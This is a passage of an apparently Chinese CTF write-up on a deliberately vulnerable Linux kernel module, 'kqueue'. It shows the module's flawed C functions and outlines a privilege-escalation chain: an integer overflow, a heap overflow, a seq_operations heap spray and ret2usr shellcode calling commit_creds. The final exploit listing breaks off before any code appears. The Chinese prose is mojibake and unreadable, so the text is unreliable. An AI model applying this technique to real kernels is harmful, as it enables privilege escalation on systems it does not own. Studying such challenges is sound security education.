æœ€ç»ˆçš„ç»“æœä¸º0ï¼Œä»è€Œåœ¨åç»­è¿›è¡Œ kmalloc æ—¶ä¾¿åªåˆ†é…äº†ä¸€ä¸ª queue çš„å¤§å°ï¼Œä½†æ˜¯å­˜æ”¾åˆ° queue çš„ max_entries åŸŸçš„å€¼ä¸º <code>request.max_entries</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br><span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br><span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªç§»åŠ¨æŒ‡é’ˆçš„ä»£ç çœ‹å¾—ç¬”è€…æ¯”è¾ƒç–‘æƒ‘ï¼Œå› ä¸ºåœ¨ç¬”è€…çœ‹æ¥å¯ä»¥ç›´æ¥å†™ä½œ <code>(queue_entry *)(queue + 1)</code>ï¼Œ<del>ä¸è¿‡é˜¿ä¸‰çš„ä»£ç æ‡‚çš„éƒ½æ‡‚</del></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">kqueue_entry = (queue_entry *)((<span class="hljs-keyword">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br></code></pre></div></td></tr></table></figure><p>åœ¨åˆ†é… queue-&gt;data æ—¶ç»™ kmalloc ä¼ å…¥çš„å¤§å°ä¸º <code>request.data_size</code>ï¼Œé™åˆ¶ä¸º 0x20</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br></code></pre></div></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šä¸ºæ¯ä¸€ä¸ª queue_entry çš„ data åŸŸéƒ½åˆ†é…ä¸€å—å†…å­˜ï¼Œå¤§å°ä¸º <code>request.data_size</code>ï¼Œä¸” queue_entry ä»ä½åœ°å€å‘é«˜åœ°å€è¿æ¥æˆä¸€ä¸ªå•å‘é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-keyword">char</span> *)(validate((<span class="hljs-keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br><br>        <span class="hljs-comment">/* Increment current_entry by size of queue_entry */</span><br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">/* Populate next pointer of the previous entry */</span><br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>åœ¨æœ€åä¼šåœ¨ kqueue æ•°ç»„ä¸­æ‰¾ä¸€ä¸ªç©ºçš„ä½ç½®æŠŠåˆ†é…çš„ queue æŒ‡é’ˆæ”¾è¿›å»</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">uint32_t</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>    <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>    err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br><br><span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>kqueues[j] = <span class="hljs-built_in">queue</span>;<br>queueCount++;<br>result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> result;<br></code></pre></div></td></tr></table></figure><h4 id="delete-kqueue"><a href="#delete-kqueue" class="headerlink" title="delete_kqueue"></a>delete_kqueue</h4><p>å¸¸è§„çš„åˆ é™¤åŠŸèƒ½ï¼Œä¸è¿‡è¿™é‡Œæœ‰ä¸ª bug æ˜¯å…ˆé‡Šæ”¾åå†æ¸…é›¶ï¼Œç¬”è€…è®¤ä¸ºä¼šæŠŠ free object çš„next æŒ‡é’ˆç»™æ¸…æ‰ï¼Œæœ‰å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">delete_kqueue</span><span class="hljs-params">(<span class="hljs-keyword">request_t</span> request)</span></span>&#123;<br>    <span class="hljs-comment">/* Check for out of bounds requests */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check for existence of the request kqueue */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = kqueues[request.queue_idx];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">queue</span>)<br>        err(<span class="hljs-string">&quot;[-] Requested kqueue does not exist&quot;</span>);<br><br>    kfree(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">queue</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">queue</span>-&gt;queue_size);<br>    kqueues[request.queue_idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="edit-kqueue"><a href="#edit-kqueue" class="headerlink" title="edit_kqueue"></a>edit_kqueue</h4><p>ä¸»è¦æ˜¯ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®åˆ°æŒ‡å®š queue_entry-&gt;sizeï¼Œå¦‚æœç»™çš„ entry_idxä¸º 0 åˆ™æ‹·åˆ° queue-&gt;data</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">edit_kqueue</span><span class="hljs-params">(<span class="hljs-keyword">request_t</span> request)</span></span>&#123;<br>    <span class="hljs-comment">/* Check the idx of the kqueue */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check if the kqueue exists at that idx */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = kqueues[request.queue_idx];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">queue</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue does not exist&quot;</span>);<br><br>    <span class="hljs-comment">/* Check the idx of the kqueue entry */</span><br>    <span class="hljs-keyword">if</span>(request.entry_idx &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Get to the kqueue entry memory */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* Check for the existence of the kqueue entry */</span><br>    exists = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-built_in">queue</span>-&gt;max_entries+<span class="hljs-number">1</span>;i++)&#123;<br><br>        <span class="hljs-comment">/* If kqueue entry found , do the necessary */</span><br>        <span class="hljs-keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="hljs-built_in">queue</span>-&gt;data_size)&#123;<br>            <span class="hljs-keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;<br>                validate(<span class="hljs-built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="hljs-built_in">queue</span>-&gt;data_size));<br>                exists = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        kqueue_entry = kqueue_entry-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span><br>    <span class="hljs-keyword">if</span>(request.entry_idx==<span class="hljs-number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="hljs-built_in">queue</span>-&gt;data_size)&#123;<br>        validate(<span class="hljs-built_in">memcpy</span>(<span class="hljs-built_in">queue</span>-&gt;data,request.data,<span class="hljs-built_in">queue</span>-&gt;data_size));<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!exists)<br>        <span class="hljs-keyword">return</span> NOT_EXISTS;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></div></td></tr></table></figure><h4 id="save-kqueue-entries"><a href="#save-kqueue-entries" class="headerlink" title="save_kqueue_entries"></a>save_kqueue_entries</h4><p>è¿™ä¸ªåŠŸèƒ½ä¸»è¦æ˜¯åˆ†é…ä¸€å—ç°æœ‰ <code>queue-&gt;queue_size</code> å¤§å°çš„ object ç„¶åæŠŠ queue-&gt;data ä¸å…¶æ‰€æœ‰ queue_entries-&gt;data çš„å†…å®¹æ‹·è´åˆ°ä¸Šè¾¹ï¼Œè€Œå…¶æ¯æ¬¡æ‹·è´çš„å­—èŠ‚æ•°ç”¨çš„æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ <code>request.data_size</code> ï¼Œåœ¨è¿™é‡Œå¾ˆæ˜æ˜¾å­˜åœ¨å †æº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-keyword">request_t</span> request)</span></span>&#123;<br><br>    <span class="hljs-comment">/* Check for out of bounds queue_idx requests */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check if queue is already saved or not */</span><br>    <span class="hljs-keyword">if</span>(isSaved[request.queue_idx]==<span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Queue already saved&quot;</span>);<br><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate(kqueues[request.queue_idx]);<br><br>    <span class="hljs-comment">/* Check if number of requested entries exceed the existing entries */</span><br>    <span class="hljs-keyword">if</span>(request.max_entries &lt; <span class="hljs-number">1</span> || request.max_entries &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid entry count&quot;</span>);<br><br>    <span class="hljs-comment">/* Allocate memory for the kqueue to be saved */</span><br>    <span class="hljs-keyword">char</span> *new_queue = validate((<span class="hljs-keyword">char</span> *)kzalloc(<span class="hljs-built_in">queue</span>-&gt;queue_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Each saved entry can have its own size */</span><br>    <span class="hljs-keyword">if</span>(request.data_size &gt; <span class="hljs-built_in">queue</span>-&gt;queue_size)<br>        err(<span class="hljs-string">&quot;[-] Entry size limit exceed&quot;</span>);<br><br>    <span class="hljs-comment">/* Copy main&#x27;s queue&#x27;s data */</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">queue</span>-&gt;data &amp;&amp; request.data_size)<br>        validate(<span class="hljs-built_in">memcpy</span>(new_queue,<span class="hljs-built_in">queue</span>-&gt;data,request.data_size));<br>    <span class="hljs-keyword">else</span><br>        err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>    new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br><br>    <span class="hljs-comment">/* Get to the entries of the kqueue */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* copy all possible kqueue entries */</span><br>    <span class="hljs-keyword">uint32_t</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)<br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));<br>        <span class="hljs-keyword">else</span><br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>        kqueue_entry = kqueue_entry-&gt;next;<br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br>    &#125;<br><br>    <span class="hljs-comment">/* Mark the queue as saved */</span><br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå…¨å±€æ•°ç»„æ ‡è¯†ä¸€ä¸ª queue æ˜¯å¦ saved äº†</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">bool</span> isSaved[MAX_QUEUES] = &#123;<span class="hljs-literal">false</span>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="Step-I-æ•´æ•°æº¢å‡º"><a href="#Step-I-æ•´æ•°æº¢å‡º" class="headerlink" title="Step I.æ•´æ•°æº¢å‡º"></a>Step I.æ•´æ•°æº¢å‡º</h4><p>è€ƒè™‘åˆ°åœ¨ create_queue ä¸­ä½¿ç”¨ <code>request.max_entries + 1</code> æ¥è¿›è¡Œåˆ¤å®šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¼ å…¥ 0xffffffff ä½¿å¾—å…¶åªåˆ†é…ä¸€ä¸ª queue å’Œä¸€ä¸ª data è€Œä¸åˆ†é… queue_entryçš„åŒæ—¶ä½¿å¾— <code>queue-&gt;max_entries = 0xffffffff</code>ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„ queue-&gt;queue_size ä¾¿ä¸º 0x18</p><h4 id="Step-II-å †æº¢å‡º-å †å–·å°„è¦†å†™-seq-operations-æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ"><a href="#Step-II-å †æº¢å‡º-å †å–·å°„è¦†å†™-seq-operations-æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ" class="headerlink" title="Step II.å †æº¢å‡º + å †å–·å°„è¦†å†™ seq_operations æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ"></a>Step II.å †æº¢å‡º + å †å–·å°„è¦†å†™ seq_operations æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</h4><p>å‰é¢æˆ‘ä»¬è¯´åˆ°åœ¨ save_kqueue_entries() ä¸­å­˜åœ¨ç€å †æº¢å‡ºï¼Œè€Œåœ¨è¯¥å‡½æ•°ä¸­åˆ†é…çš„ object å¤§å°ä¸º queue-&gt;queue_sizeï¼Œå³ 0x18ï¼Œåº”å½“ä» <code>kmalloc-32</code> ä¸­å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥è€ƒè™‘åœ¨è¯¥ slab ä¸­å¯ç”¨çš„ç»“æ„ä½“</p><p>ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œ<strong>seq_operations</strong> è¿™ä¸ªç»“æ„ä½“åŒæ ·ä» <code>kmalloc-32</code> ä¸­åˆ†é…ï¼Œå½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ª stat æ–‡ä»¶æ—¶ï¼ˆå¦‚ <code>/proc/self/stat</code> ï¼‰ä¾¿ä¼šåœ¨å†…æ ¸ç©ºé—´ä¸­åˆ†é…ä¸€ä¸ª seq_operations ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/seq_file.h</code> å½“ä¸­ï¼Œåªå®šä¹‰äº†å››ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>    <span class="hljs-keyword">void</span> * (*start) (struct seq_file *m, <span class="hljs-keyword">loff_t</span> *pos);<br>    <span class="hljs-keyword">void</span> (*stop) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>    <span class="hljs-keyword">void</span> * (*next) (struct seq_file *m, <span class="hljs-keyword">void</span> *v, <span class="hljs-keyword">loff_t</span> *pos);<br>    <span class="hljs-keyword">int</span> (*show) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å½“æˆ‘ä»¬ read ä¸€ä¸ª stat æ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨å…¶ proc_ops çš„ <code>proc_read_iter</code> æŒ‡é’ˆï¼Œå…¶é»˜è®¤å€¼ä¸º <code>seq_read_iter()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>fs/seq_file.c</code> ä¸­ï¼Œæ³¨æ„åˆ°æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">seq_read_iter</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *iter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>    <span class="hljs-comment">//...</span><br>    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>    <span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>å³å…¶ä¼šè°ƒç”¨ seq_operations ä¸­çš„ start å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆ<strong>æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ seq_operations-&gt;start åå†è¯»å–å¯¹åº” stat æ–‡ä»¶ä¾¿èƒ½æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä¿è¯ä¸€å®šèƒ½å¤Ÿæº¢å‡ºåˆ°ä¸€ä¸ª <code>seq_operations</code> å‘¢ï¼Ÿè™½ç„¶è¯´å¯¹äºå¼€å¯äº† random freelist ä¿æŠ¤ï¼ˆé»˜è®¤å¼€å¯ï¼‰çš„ kernel è€Œè¨€æˆ‘ä»¬æ— æ³•ç›´æ¥å¾—çŸ¥åˆ†é…çš„ object å¯¹åº”çš„å†…å­˜å¸ƒå±€ï¼ˆ<del>glibcè¿™ä¸€ç‚¹å°±åšå¾—å¾ˆå¥½ï¼Œå¹³æ•´çš„å†…å­˜å¸ƒå±€å¯ä»¥è®©ğŸ‘´ç›´æ¥çŸ¥é“ Pwn é¢˜é‡Œåˆ†é…çš„æ¯ä¸€ä¸ª chunk çš„ä½ç½®</del>ï¼‰ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>å †å–·å°„</strong>çš„æ‰‹æ³•åœ¨å†…æ ¸ç©ºé—´å–·å°„è¶³å¤Ÿå¤šçš„ seq_operations ç»“æ„ä½“å¸ƒæ»¡ vulnerable object æ‰€åœ¨çš„å†…å­˜é™„è¿‘åŒºåŸŸï¼Œä»è€Œä¿è¯æˆ‘ä»¬èƒ½å¤Ÿæº¢å‡ºåˆ°å…¶ä¸­ä¹‹ä¸€</p><h4 id="Step-III-ret2usr-ret2shellcode"><a href="#Step-III-ret2usr-ret2shellcode" class="headerlink" title="Step III.ret2usr + ret2shellcode"></a>Step III.ret2usr + ret2shellcode</h4><p>ç”±äºæ²¡æœ‰å¼€å¯ smepã€smapã€kptiï¼Œæ•… ret2usr çš„æ”»å‡»æ‰‹æ³•åœ¨æœ¬é¢˜ä¸­æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯ç”±äºå¼€å¯äº† kaslr çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“ prepare_kernel_cred å’Œ commit_creds çš„åœ°å€ï¼Œä¼¼ä¹æ— æ³•ç›´æ¥æ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(NULL))</code></p><p>è¿™é‡Œ ScuPax0s å¸ˆå‚…ç»™å‡ºäº†ä¸€ä¸ªç¾å¦™çš„è§£æ³•ï¼šé€šè¿‡ç¼–å†™ <strong>shellcode</strong> åœ¨å†…æ ¸æ ˆä¸Šæ‰¾æ°å½“çš„æ•°æ®ä»¥è·å¾—å†…æ ¸åŸºå€ï¼Œæ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(NULL))</code> å¹¶è¿”å›åˆ°ç”¨æˆ·æ€</p><h4 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h4><p>æ•…æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span 